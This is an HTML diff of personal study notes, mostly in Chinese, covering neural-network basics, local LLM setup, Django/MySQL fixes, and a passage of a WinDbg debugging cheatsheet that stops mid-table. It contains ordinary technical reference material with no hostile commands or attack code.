+</blockquote>
+<h1 id="use-cases"><a class="header" href="#use-cases">Use cases</a></h1>
+<h2 id=""><a class="header" href="#"></a></h2>
+<h1 id="fine-tune"><a class="header" href="#fine-tune">fine-tune</a></h1>
+<p>https://github.com/brevdev/notebooks/blob/main/llama2-finetune-own-data.ipynb 一些notebook实践</p>
+<p>https://news.ycombinator.com/item?id=37484135 精读</p>
+<h1 id="hardware"><a class="header" href="#hardware">hardware</a></h1>
+<p>是的，3090 是当地人工智能社区的一个模因。 此外，支持也令人惊叹，因为它的架构与 A100 基本相同。</p>
+<p>3060 也很受欢迎，它是 3090 的一半。</p>
+<p>https://news.ycombinator.com/item?id=38589520</p>
+<p>George Hotz | Programming | Mistral mixtral on a tinybox | AMD P2P multi-GPU mixtral-8x7b-32kseqlen
+1:24:11 / 2:37:51</p>
+<h1 id="llama"><a class="header" href="#llama">llama</a></h1>
+<pre><code>git clone --depth=1 https://github.com/ggerganov/llama.cpp
+cd llama.cpp/
+make
+
+Q:/Downloads/ai/llama.cpp $ ./main.exe  -m &quot;Q:\Downloads\mistral-7b-instruct-v0.1.Q4_K_M.gguf&quot; -p &quot;golang and zig&quot; -n 400 -e
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sgd"><a class="header" href="#sgd">SGD</a></h1>
+<p>提供一种 SGD 方法，该方法 实现随机梯度下降</p>
+<p>sophisticated algorithm ≤ simple learning algorithm + good training data.</p>
+<pre><code>&gt;&gt;&gt; import mnist_loader
+&gt;&gt;&gt; training_data, validation_data, test_data = mnist_loader.load_data_wrapper()
+&gt;&gt;&gt; import network
+&gt;&gt;&gt; net = network.Network([784, 30, 10])
+&gt;&gt;&gt; net.SGD(training_data, 30, 10, 3.0, test_data=test_data)
+Epoch 0: 9058 / 10000, took 8.89 seconds
+Epoch 1: 9197 / 10000, took 8.88 seconds
+</code></pre>
+<h1 id="反向传播算法"><a class="header" href="#反向传播算法">反向传播算法</a></h1>
+<p>反向传播算法最初是在 20 世纪 70 年代引入的， 但直到 著名的 1986 年 论文 大卫 鲁梅尔哈特 _ 杰弗里 辛顿 ,和 罗纳德 威廉姆斯 。 该论文描述了几个 反向传播比以前快得多的神经网络 学习方法，使得使用神经网络来解决问题成为可能 以前无法解决的问题。 今天， 反向传播算法是神经网络学习的主力 网络。</p>
+<p>反向传播算法是神经网络训练的关键步骤，通过该算法可以有效地调整神经网络的参数（权重和偏置），以使其逼近期望的输出。该算法的工作原理可以简单概括如下：</p>
+<pre><code>前向传播：首先，通过神经网络的前向传播，将输入数据从输入层经过隐藏层传播到输出层，得到模型的预测输出。
+
+计算损失：将模型的预测输出与实际期望输出进行比较，计算损失函数(cost function)（如均方误差或交叉熵(cross-entopy)），用于衡量模型预测的准确程度。
+
+反向传播：根据损失函数，利用链式法则计算损失函数对神经网络中各层参数（权重和偏置）的梯度。这些梯度表示了损失函数对参数的变化敏感程度。
+
+参数更新：根据梯度下降算法，通过不断迭代，以最小化损失函数为目标，逐步调整神经网络中的参数，使得模型的预测输出逐渐逼近期望输出。
+</code></pre>
+<p>反向传播算法的关键在于通过计算损失函数对参数的梯度，实现了对神经网络参数的自动调整，从而提高了神经网络的准确性和泛化能力。</p>
+<blockquote>
+<p>an:
+增加了负反馈调节</p>
+</blockquote>
+<h1 id="过拟合"><a class="header" href="#过拟合">过拟合</a></h1>
+<p>过拟合是指机器学习模型在训练数据上表现良好，但在新数据上表现不佳的不良行为。这种情况发生时，模型会过于复杂，以至于记住了训练数据中的噪音和随机波动，而无法很好地泛化到新的数据集上。过拟合通常是由于训练数据量太小、包含大量无关信息、训练时间过长或模型复杂度过高等原因引起的。</p>
+<p>为了检测过拟合，可以使用K折交叉验证等方法。K折交叉验证将训练集等分成K个子集，然后进行K次迭代训练和验证，最终得到模型的平均性能评估。</p>
+<p>为了避免过拟合，可以采取一些方法，比如提前停止训练、增加训练数据、数据增强、特征选择、正则化和集成学习等。这些方法有助于降低模型的复杂度，减少噪音的影响，从而提高模型的泛化能力。</p>
+<blockquote>
+<p>an:
+原因：前摇过长。
+解决方法：尽早引入考试和验证，及时纠错</p>
+</blockquote>
+<h2 id="避免过拟合regularization-正则化"><a class="header" href="#避免过拟合regularization-正则化">避免过拟合：Regularization 正则化</a></h2>
+<p>Regularization是机器学习中用来避免过拟合的一种技术。过拟合指的是模型在训练数据上表现良好，但在新数据上表现不佳的情况。Regularization通过对模型的复杂度进行惩罚，来防止模型学习训练数据中的噪声，从而提高模型的泛化能力。</p>
+<p>在Regularization中，有两种常见的方法：Ridge Regression和Lasso Regression。Ridge Regression通过向损失函数中添加一个收缩量来修改残差平方和，从而对模型的灵活性进行惩罚。而Lasso Regression则使用绝对值的惩罚来限制模型的复杂度。</p>
+<p>这些Regularization技术有助于减少模型的方差，提高模型的泛化能力，而不会显著增加模型的偏差。通过调整Regularization的参数，可以控制对模型偏差和方差的影响，从而在避免过拟合的同时保持模型的重要特性。</p>
+<p>除了Ridge Regression和Lasso Regression，Regularization还可以应用于稀疏性正则化、半监督学习和多任务学习等领域。这些Regularization技术的应用有助于提高模型的稳定性和泛化能力，是机器学习中重要的技术手段之一。</p>
+<blockquote>
+<p>an: 减少模型的复杂性</p>
+</blockquote>
+<h1 id="评分函数score-function和损失函数loss-function"><a class="header" href="#评分函数score-function和损失函数loss-function">评分函数(score function)和损失函数(loss function)</a></h1>
+<p>概述。我们现在将开发一种更强大的图像分类方法，最终将自然地扩展到整个神经网络和卷积神经网络。该方法将有两个主要组成部分：将原始数据映射到类别分数的分数函数(score function)，以及量化预测分数和真实标签之间的一致性的损失函数(loss function)。然后，我们将其视为一个优化问题，目标是更新score function的参数来最小化loss function</p>
+<h1 id="gpu-choice"><a class="header" href="#gpu-choice">gpu choice</a></h1>
+<p>RTX 2070
+https://www.thepaper.cn/newsDetail_forward_22138632</p>
+<p>3080和4070Ti
+https://timdettmers.com/2018/12/16/deep-learning-hardware-guide/</p>
+<h1 id="adam"><a class="header" href="#adam">Adam</a></h1>
+<p>https://github.com/kartik4949/tinygrad/commit/26ce2d93c3b8da2eed3ed0620212628e7dcfc459</p>
+<p>George Hotz | Programming | tinygrad and more neural networks from scratch | Part1
+直播： https://www.youtube.com/watch?v=Xtws3-Pk69o 35:51</p>
+<p>Adam是一种 <strong>优化算法</strong> ，用于更新神经网络权重。它是一种替代传统随机梯度下降程序的优化算法。Adam算法是由OpenAI的Diederik Kingma和多伦多大学的Jimmy Ba在2015年的ICLR论文中提出的。Adam算法的名称源自自适应矩估计（adaptive moment estimation）。Adam算法的优点包括易于实现、计算效率高、内存需求低、适用于大规模数据和参数、适用于非平稳目标、适用于梯度非常嘈杂或稀疏的问题。Adam算法与传统的随机梯度下降不同，它维护每个网络权重的学习率，并在学习过程中分别进行调整。Adam算法结合了AdaGrad和RMSProp的优点，通过计算梯度的一阶矩和二阶矩的指数移动平均值来计算不同参数的自适应学习率。Adam算法在实践中表现良好，与其他随机优化方法相比效果显著。在深度学习领域，Adam算法被广泛应用，并被推荐作为默认的优化方法。</p>
+<h1 id="dropout"><a class="header" href="#dropout">Dropout</a></h1>
+<p>https://github.com/tinygrad/tinygrad/commit/d901ef6b23f76205ad8d47679b75dd0342ef7626 引入tinygrad (Dec 13, 2020)</p>
+<p>https://www.cs.toronto.edu/~rsalakhu/papers/srivastava14a.pdf p5 算法</p>
+<p>Bernoulli random 0-1随机</p>
+<p>Dropout是一种用于深度学习神经网络的正则化方法。在训练过程中，Dropout会随机丢弃神经网络中的一些节点，以防止过拟合。过拟合是指模型在训练数据上表现良好，但在测试数据上表现不佳的情况。Dropout通过随机丢弃节点，使得每次训练时网络的结构都不同，从而增加了模型的鲁棒性，减少了过拟合的风险。</p>
+<p>在实践中，Dropout可以通过在每个隐藏层中随机丢弃一定比例的节点来实现。这样做可以使得网络在训练过程中变得更加嘈杂，迫使每个节点以概率性的方式承担更多或更少的输入责任。这种概念表明，Dropout可以打破网络层之间的相互适应，从而使模型更加健壮。</p>
+<p>在使用Dropout时，需要设置一个丢弃概率，用于指定在训练过程中丢弃节点的概率。通常情况下，对于隐藏层的节点，丢弃概率可以选择0.5，而对于输入层的节点，通常会选择接近1的概率。在训练结束后，需要对网络的权重进行重新缩放，以便在进行预测时能够得到正确的结果。</p>
+<p>总的来说，Dropout是一种简单而有效的正则化方法，可以帮助减少过拟合，提高深度神经网络的泛化能力。</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="generate-from-exist-table"><a class="header" href="#generate-from-exist-table">generate from exist table</a></h1>
+<p>python manage.py inspectdb &lt;tbl_name&gt;... &gt; models.py</p>
+<h1 id="mysql-support-issue"><a class="header" href="#mysql-support-issue">mysql support issue</a></h1>
+<p>django.db.utils.NotSupportedError: MySQL 8.0.11 or later is required (found 5.7.20).</p>
+<p>for old mysql version, use django4.1</p>
+<p>pip3 install django==4.1</p>
+<h1 id="mysql-lib-error-on-centos"><a class="header" href="#mysql-lib-error-on-centos">mysql lib error on centos</a></h1>
+<p>rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
+yum -y install mysql-devel
+pip install mysqlclient -i https://pypi.douban.com/simple/
+export LD_LIBRARY_PATH=/usr/lib64/mysql/</p>
+<div style="break-before: page; page-break-before: always;"></div><p>中文字体：https://github.com/lxgw/LxgwWenKai-Lite/releases</p>
+<p>英文字体：Jetbrains Mono</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="security"><a class="header" href="#security">security</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windbg-cheatsheet"><a class="header" href="#windbg-cheatsheet">WinDbg cheatsheet</a></h1>
+<p>origin link: <a href="https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md">https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md</a></p>
+<h2 id="content"><a class="header" href="#content">Content</a></h2>
+<ul>
+<li><a href="windbg_cheatsheet.html#windbg-cheatsheet">WinDbg cheatsheet</a>
+<ul>
+<li><a href="windbg_cheatsheet.html#content">Content</a></li>
+<li><a href="windbg_cheatsheet.html#setup">Setup</a>
+<ul>
+<li><a href="windbg_cheatsheet.html#symbol-path">Symbol Path</a></li>
+<li><a href="windbg_cheatsheet.html#providers">Providers</a></li>
+<li><a href="windbg_cheatsheet.html#vs-code-linting">VS Code linting</a></li>
+<li><a href="windbg_cheatsheet.html#kernel-debugging">Kernel Debugging</a></li>
+</ul>
+</li>
+<li><a href="windbg_cheatsheet.html#commands">Commands</a>
+<ul>
+<li><a href="windbg_cheatsheet.html#basic-commands">Basic commands</a>
+<ul>
+<li><a href="windbg_cheatsheet.html#printf-formatters"><code>.printf</code> formatters</a></li>
+</ul>
+</li>
+<li><a href="windbg_cheatsheet.html#execution-flow">Execution flow</a></li>
+<li><a href="windbg_cheatsheet.html#registers--memory-access">Registers / Memory access</a></li>
+<li><a href="windbg_cheatsheet.html#memory-search">Memory search</a></li>
+<li><a href="windbg_cheatsheet.html#breakpoints">Breakpoints</a></li>
+<li><a href="windbg_cheatsheet.html#symbols">Symbols</a></li>
+<li><a href="windbg_cheatsheet.html#convenience-variables-and-functions">Convenience variables and functions</a></li>
+<li><a href="windbg_cheatsheet.html#useful-extensions">Useful extensions</a></li>
+<li><a href="windbg_cheatsheet.html#net-debugging">.NET Debugging</a></li>
+</ul>
+</li>
+<li><a href="windbg_cheatsheet.html#linq--debugger-data-model">LINQ &amp; Debugger Data Model</a>
+<ul>
+<li><a href="windbg_cheatsheet.html#variables">Variables</a></li>
+<li><a href="windbg_cheatsheet.html#functions">Functions</a></li>
+</ul>
+</li>
+<li><a href="windbg_cheatsheet.html#windbg-javascript-reference">WinDbg JavaScript reference</a>
+<ul>
+<li><a href="windbg_cheatsheet.html#dealing-with-hostint64">Dealing with <code>host.Int64</code></a></li>
+<li><a href="windbg_cheatsheet.html#windbg-gallery-skeleton">WinDbg gallery skeleton</a></li>
+</ul>
+</li>
+<li><a href="windbg_cheatsheet.html#time-travel-debugging">Time-Travel Debugging</a></li>
+<li><a href="windbg_cheatsheet.html#additional-resources">Additional resources</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
+<h3 id="symbol-path"><a class="header" href="#symbol-path">Symbol Path</a></h3>
+<p>In a command prompt:</p>
+<pre><code class="language-batch">C:\&gt; setx _NT_SYMBOL_PATH srv*C:\Symbols*https://msdl.microsoft.com/download/symbols
+</code></pre>
+<p>In WinDbg, <code>Ctrl+S</code> then</p>
+<pre><code class="language-batch">srv*C:\Symbols*https://msdl.microsoft.com/download/symbols
+</code></pre>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="providers"><a class="header" href="#providers">Providers</a></h3>
+<p>In WinDbg</p>
+<pre><code>0:000&gt; .scriptproviders
+</code></pre>
+<p>Should display something like</p>
+<pre><code>Available Script Providers:
+    NatVis (extension '.NatVis')
+    JavaScript (extension '.js')
+</code></pre>
+<h3 id="vs-code-linting"><a class="header" href="#vs-code-linting">VS Code linting</a></h3>
+<p>Download <a href="JsProvider.d.ts">JsProvider.d.ts</a> to the root of your script and add the following at its top:</p>
+<pre><code class="language-javascript">/// &lt;reference path=&quot;JSProvider.d.ts&quot; /&gt;
+&quot;use strict&quot;;
+</code></pre>
+<h3 id="kernel-debugging"><a class="header" href="#kernel-debugging">Kernel Debugging</a></h3>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/reading-and-filtering-debugging-messages#setting-the-component-filter-mask">Increase the kernel verbosity level</a> from calls to <code>KdPrintEx()</code>
+<ul>
+<li>temporarily during runtime from WinDbg (lost once session is closed)</li>
+</ul>
+</li>
+</ul>
+<pre><code>kd&gt; ed nt!Kd_Default_Mask 0xf
+</code></pre>
+<ul>
+<li>permanently from registry hive (in Admin prompt on Debuggee)</li>
+</ul>
+<pre><code>C:\&gt; reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter&quot; /v DEFAULT /t REG_DWORD /d 0xf
+</code></pre>
+<h2 id="commands"><a class="header" href="#commands">Commands</a></h2>
+<h3 id="basic-commands"><a class="header" href="#basic-commands">Basic commands</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Help / Manual</td><td><code>.hh &lt;command&gt;</code></td><td><code>.hh</code> <br> <code>.hh !process</code></td></tr>
+<tr><td align="left">Clear screen</td><td><code>.cls</code></td><td></td></tr>
+<tr><td align="left">Dynamic evaluation</td><td><code>?</code></td><td><code>? 40004141 – nt</code> <br> <code>? 2 + 2</code> <br> <code>? nt!ObTypeArrayIndex</code></td></tr>
+<tr><td align="left">Comment</td><td><code>$$</code></td><td><code>$$ this is a useful comment</code></td></tr>
+<tr><td align="left">Print a string</td><td><code>.echo</code></td><td><code>.echo &quot;Hello world&quot;</code></td></tr>
+<tr><td align="left">Print a formatted string<br>(see <a href="windbg_cheatsheet.html#printf-formatters">printf formatters</a>)</td><td><code>.printf</code></td><td><code>.printf &quot;Hello %ma\n&quot; , @$esp</code></td></tr>
+<tr><td align="left">Command separator</td><td><code>;</code></td><td><code>command1 ; command2</code></td></tr>
+<tr><td align="left">Attach (Detach) to (from) process</td><td><code>.attach</code></td><td><code>.detach</code></td></tr>
+<tr><td align="left">Display parameter value under different formats (hexadcimal, decimal, octal)</td><td><code>.formats</code></td><td><code>.formats 0x42</code></td></tr>
+<tr><td align="left">Change default base</td><td><code>n</code></td><td><code>n 8</code></td></tr>
+<tr><td align="left">Quit WinDbg (will kill the process if not detached)</td><td><code>q</code></td><td></td></tr>
+<tr><td align="left">Restart debugging session</td><td><code>.restart</code></td><td></td></tr>
+<tr><td align="left">Reboot system (KD)</td><td><code>.reboot</code></td><td></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h4 id="printf-formatters"><a class="header" href="#printf-formatters"><code>.printf</code> formatters</a></h4>
+<table><thead><tr><th align="left">Description</th><th>Formatter</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">ASCII C string (i.e. NULL terminated)</td><td><code>%ma</code></td><td></td></tr>
+<tr><td align="left">Wide C string (i.e. NULL terminated)</td><td><code>%mu</code></td><td></td></tr>
+<tr><td align="left">UNICODE_STRING** string</td><td><code>%msu</code></td><td></td></tr>
+<tr><td align="left">Print the symbol pointed by address</td><td><code>%y</code></td><td><code>.printf “%y\n”,ffff8009bc2010 // returns nt!PsLoadedModuleList</code></td></tr>
+<tr><td align="left">Print a Pointer</td><td><code>%p</code></td><td><code>.printf “%p\n”,nt!PsLoadedModuleList  // returns 0xffff8009bc2010</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="execution-flow"><a class="header" href="#execution-flow">Execution flow</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Start or resume execution (go)</td><td><code>g</code></td><td></td></tr>
+<tr><td align="left">Dump register(s)</td><td><code>r</code></td><td><code>r</code> <br> <code>r eax</code> <br> <code>r rax=42</code></td></tr>
+<tr><td align="left">Step over</td><td><code>p</code></td><td><code>pa 0xaddr</code> (step over until 0xaddr is reached) <br><code>pt</code> (step over until return) <br> <code>pc</code> (step over until next call)</td></tr>
+<tr><td align="left">Step into</td><td><code>t</code></td><td>Same as above, replace <code>p</code> with <code>t</code></td></tr>
+<tr><td align="left">Execute until reaching current frame return address (go upper)</td><td><code>gu</code></td><td></td></tr>
+<tr><td align="left">List module(s)</td><td><code>lm</code></td><td><code>lm</code> (UM: display all modules) <br><code>lm</code> (KM: display all drivers and sections) <br> <code>lm m *MOD*</code> (show module with pattern '<code>MOD</code>' )</td></tr>
+<tr><td align="left">Get information about current debugging status</td><td><code>.lastevent</code><br><code>!analyze</code></td><td></td></tr>
+<tr><td align="left">Show stack call</td><td><code>k</code><br><code>kp</code></td><td></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="registers--memory-access"><a class="header" href="#registers--memory-access">Registers / Memory access</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Read memory As</td><td>bytes: <code>db</code><br>word: <code>dw</code><br>dword: <code>dd</code><br>qword: <code>dq</code><br>pointer: <code>dp</code><br>unicode string: <code>dW</code></td><td><code>db @sp 41 41 41 41</code><br><code>dw @rip</code><br><code>dd @rax l4</code><br><code>dyb @rip</code><br><code>dps @esp</code><br><code>dW @rsp</code></td></tr>
+<tr><td align="left">Write memory As</td><td>bytes: <code>eb</code><br>word: <code>ew</code><br>dword: <code>ed</code><br>qword: <code>eq</code><br>ascii string:<code>ea</code><br>Unicode string: <code>eu</code></td><td><br><br><br><code>ea @pc &quot;AAAA&quot;</code></td></tr>
+<tr><td align="left">Read register(s)</td><td><code>r</code><br><code>r [[REG0],REG1,...]</code></td><td><code>r rax,rbp</code></td></tr>
+<tr><td align="left">Write register(s)</td><td><code>r [REG]=[VALUE]</code></td><td><code>r rip=4141414141414141</code></td></tr>
+<tr><td align="left">Show register(s) modified by the current instruction</td><td><code>r.</code></td><td></td></tr>
+<tr><td align="left">Dump memory to file</td><td><code>.writemem</code></td><td><code>.writemem C:\mem.raw @eip l1000</code></td></tr>
+<tr><td align="left">Load memory from file</td><td><code>.readmem</code></td><td><code>.readmem C:\mem.raw @rip l1000</code></td></tr>
+<tr><td align="left">Dump MZ/PE header info</td><td><code>!dh</code></td><td><code>!dh kernel32</code><br><code>!dh @rax</code></td></tr>
+<tr><td align="left">Read / write physical memory<br>(syntax similar to <code>dX</code>/<code>eX</code> commands)</td><td><code>!db</code> / <code>!eb</code> <br><code>!dw</code> / <code>!ew</code> <br><code>!dd</code> / <code>!ed</code> <br><code>!dq</code> / <code>!eq</code></td><td></td></tr>
+<tr><td align="left">Fill / Compare memory</td><td><code>f</code><br> <code>c</code></td><td><code>f @rsp l8 41</code><br> <code>c @rsp l8 @rip</code></td></tr>
+<tr><td align="left">Dereference memory</td><td><code>poi(&lt;AddrOrSymbol&gt;)</code>: dereference pointer size<br><code>dwo()</code>: dereference DWORD<br><code>qwo()</code>: dereference QWORD</td><td><code>db poi( @$rax )</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="memory-search"><a class="header" href="#memory-search">Memory search</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Search</td><td>byte: <code>s [RANGE] [VALUE]</code><br>dword: <code>s -d [RANGE] [DWORD_VALUE]</code></td><td><code>s @eip @eip+100 90 90 90 cc</code><br><code>s -d @eax l100 41424344</code></td></tr>
+<tr><td align="left">Search ASCII (Unicode)</td><td><code>s –a &lt;AddrStart&gt; L&lt;NbByte&gt; &quot;Pattern&quot;</code><br> <code>s –a &lt;AddrStart&gt; &lt;AddrEnd&gt; &quot;Pattern&quot;</code><br> (for Unicode – change <code>–a</code> with <code>–u</code>)</td><td></td></tr>
+<tr><td align="left">Search for pattern in command</td><td><code>.shell</code></td><td><code>.shell -ci &quot;&lt;windbg command&gt;&quot; batch command</code><br><code>.shell -ci &quot;!address&quot; findstr PAGE_EXECUTE_READWRITE</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="breakpoints"><a class="header" href="#breakpoints">Breakpoints</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Examine</td><td><code>x</code></td><td><code>x nt!*CreateProcess*</code></td></tr>
+<tr><td align="left">Display types</td><td><code>dt</code></td><td><code>dt ntdll!_PEB @$peb</code><br><code>dt ntdll!_TEB –r @$teb</code></td></tr>
+<tr><td align="left">Display Type Extended - with Debugger Object Model</td><td><code>dtx</code></td><td><code>dtx nt!_PEB 0x000008614a7a000</code><br>which is equivalent to<br><code>dx (nt!_PEB*)0x000008614a7a000</code></td></tr>
+<tr><td align="left">Set breakpoint</td><td><code>bp</code> <br><code>bp 0xaddr (or mod!symbol)</code></td><td></td></tr>
+<tr><td align="left">List breakpoints</td><td><code>bl</code></td><td></td></tr>
+<tr><td align="left">Disable breakpoint(s)</td><td><code>bd [IDX]</code> (<code>IDX</code> is returned by <code>bl</code>)</td><td><code>bd 1</code><br><code>bd *</code></td></tr>
+<tr><td align="left">Delete breakpoint(s)</td><td><code>bc [IDX]</code> (<code>IDX</code> is returned by <code>bl</code>)</td><td><code>bc 0</code><br><code>bc *</code></td></tr>
+<tr><td align="left">(Un)Set exception on event</td><td><code>sx</code></td><td><code>sxe ld mydll.dll</code></td></tr>
+<tr><td align="left">Break on memory access</td><td><code>ba</code></td><td><code>ba r 4 @esp</code></td></tr>
+<tr><td align="left">Define breakpoint command</td><td><code>bp … [Command]</code><br>Where [Command] can be<br>- an action: &quot;<code>r ; g</code>&quot;<br>- a condition: &quot;<code>.if (@$rax == 1) {.printf \&quot;rcx=%p\\\n\&quot;, @rcx }</code>&quot;</td><td><code>bp kernel32!CreateFileA &quot;da @rcx; g&quot;</code> &quot;</td></tr>
+<tr><td align="left">Enable breakpoint <strong>after</strong> <em>N</em> hit(s)</td><td><code>bp &lt;address&gt; N+1</code></td><td><code>bp /1 0xaddr</code> (temporary breakpoint)<br><code>bp 0xaddr 7</code> (disable after 6 hits)</td></tr>
+<tr><td align="left">Set &quot;undefined&quot; breakpoint</td><td><code>bu &lt;address&gt;</code></td><td></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="symbols"><a class="header" href="#symbols">Symbols</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Examine</td><td><code>x</code></td><td><code>x /t /v ntdll!*CreateProcess*</code></td></tr>
+<tr><td align="left">Display types</td><td><code>dt</code></td><td><code>dt ntdll!_PEB @$peb</code></td></tr>
+<tr><td align="left">List nearest symbols</td><td><code>ln</code></td><td><code>ln 0xaddr</code></td></tr>
+<tr><td align="left">Set/update symbol path</td><td><code>.sympath</code></td><td></td></tr>
+<tr><td align="left">Load module symbols</td><td><code>ld</code></td><td><code>ld Module</code><br><code>ld *</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="convenience-variables-and-functions"><a class="header" href="#convenience-variables-and-functions">Convenience variables and functions</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Program entry point</td><td><code>$exentry</code></td><td><code>bp $exentry</code></td></tr>
+<tr><td align="left">Process Environment Block</td><td><code>$peb</code></td><td><code>dt _PEB @$peb</code></td></tr>
+<tr><td align="left">Thread Environment Block</td><td><code>$teb</code></td><td><code>dt _TEB @$teb</code></td></tr>
+<tr><td align="left">Return Address</td><td><code>$ra</code></td><td><code>g @ra</code></td></tr>
+<tr><td align="left">Instruction Pointer</td><td><code>$ip</code></td><td></td></tr>
+<tr><td align="left">Size of Page</td><td><code>$pagesize</code></td><td></td></tr>
+<tr><td align="left">Size of Pointer</td><td><code>$ptrsize</code></td><td></td></tr>
+<tr><td align="left">Process ID</td><td><code>$tpid</code></td><td></td></tr>
+<tr><td align="left">Thread ID</td><td><code>$tid</code></td><td></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="useful-extensions"><a class="header" href="#useful-extensions">Useful extensions</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Detailed information about loaded DLLs</td><td><code>!dlls</code><br><code>!dlls -I</code> (show load order)<br><code>!dlls -c 0xaddr</code> (show DLL containing0xaddr)</td><td></td></tr>
+<tr><td align="left">Get mapping information</td><td><code>!address</code></td><td><code>!address -f:MEM_COMMIT</code></td></tr>
+<tr><td align="left">Change verbosity of symbol loader</td><td><code>!sym</code></td><td><code>!sym noisy</code><br><code>!sym quiet</code></td></tr>
+<tr><td align="left">Dump PEB/TEB information</td><td><code>!peb</code> <br><code>!teb</code></td><td></td></tr>
+<tr><td align="left">Analyze the reason of a crash</td><td><code>!analyze</code></td><td><code>!analyze -v</code></td></tr>
+<tr><td align="left">Convert an NTSTATUS code to text</td><td><code>!error</code></td><td><code>!error c0000048</code></td></tr>
+<tr><td align="left">Perform heuristic checks to<br>the exploitability of a bug</td><td><code>!exploitable</code></td><td></td></tr>
+<tr><td align="left">Encode/decode pointer encoded<br>by KernelBase API <code>EncodePointer()</code></td><td><code>!encodeptr32</code> (or <code>64</code>)<br><code>!decodeptr32</code> (or <code>64</code>)</td><td></td></tr>
+<tr><td align="left">Display the current exception handler</td><td><code>!exchain</code></td><td></td></tr>
+<tr><td align="left">Dump UM heap information</td><td><code>!heap</code></td><td></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h3 id="net-debugging"><a class="header" href="#net-debugging">.NET Debugging</a></h3>
+<table><thead><tr><th align="left">Action</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Load the CLR extensions</td><td><code>.loadby sos clr</code></td><td><code>sxe ld clr; g</code> to make sure <code>clr.dll</code> is loaded, then <code>.loadby sos clr</code></td></tr>
+<tr><td align="left">Get help</td><td><code>!help</code></td><td></td></tr>
+<tr><td align="left">Set managed code breakpoint</td><td><code>!bpmd &lt;module&gt; Path.To.Function</code></td><td><code>!bpmd mscorlib.dll System.Reflection.Assembly.Load</code> <br> <code>!bpmd System.dll System.Diagnostics.Process.Start</code> <br> <code>!bpmd System.dll System.Net.WebClient.DownloadFile</code></td></tr>
+<tr><td align="left">List all managed code breakpoints</td><td><code>!bpmd -list</code></td><td></td></tr>
+<tr><td align="left">Clear specific managed code breakpoint</td><td><code>!bpmd -clear $BreakpointNumber</code></td><td></td></tr>
+<tr><td align="left">Clear all managed code breakpoints</td><td><code>!bpmd -clearall</code></td><td></td></tr>
+<tr><td align="left">Dump objects</td><td><code>!DumpObj</code></td><td><code>!DumpObj /d 0x&lt;address&gt;</code></td></tr>
+<tr><td align="left">Dump the .NET stack</td><td><code>!CLRStack</code></td><td><code>!CLRStack -p</code></td></tr>
+</tbody></table>
+<p><a href="windbg_cheatsheet.html#Content">Back to top</a></p>
+<h2 id="linq--debugger-data-model"><a class="header" href="#linq--debugger-data-model">LINQ &amp; Debugger Data Model</a></h2>
+<h3 id="variables"><a class="header" href="#variables">Variables</a></h3>
+<table><thead><tr><th align="left">Variable description</th><th>Command</th><th>Examples</th></tr></thead><tbody>
+<tr><td align="left">Create a variable</td><td><code>dx @$myVar = VALUE</code></td><td><code>dx @$ps = @$cursession.Processes</code></td></tr>
+<tr><td align="left">Delete a variable</td><td><code>dx @$vars.Remove(&quot;VarName&quot;)</code></td><td><code>dx @$vars.Remove(&quot;ps&quot;)</code></td></tr>
+<tr><td align="left">List user defined variable</td><td><code>dx @$vars</code> <br> <code>dx Debugger.State.UserVariables</code></td><td></td></tr>
+<tr><td align="left">Bind address <code>Address</code> to <br>a <code>N</code>-entry array of type <code>T</code></td><td><code>dx (T* [N])0xAddress </code></td><td><code>dx (void** [5]) Debugger.State.PseudoRegisters.General.csp</code></td></tr>
+</tbody></table>
+<h3 id="functions"><a class="header" href="#functions">Functions</a></h3>
+<table><thead><tr><th align="left">Function description</th><th>Command</th><th>Examples</th></tr></thead><tbody>
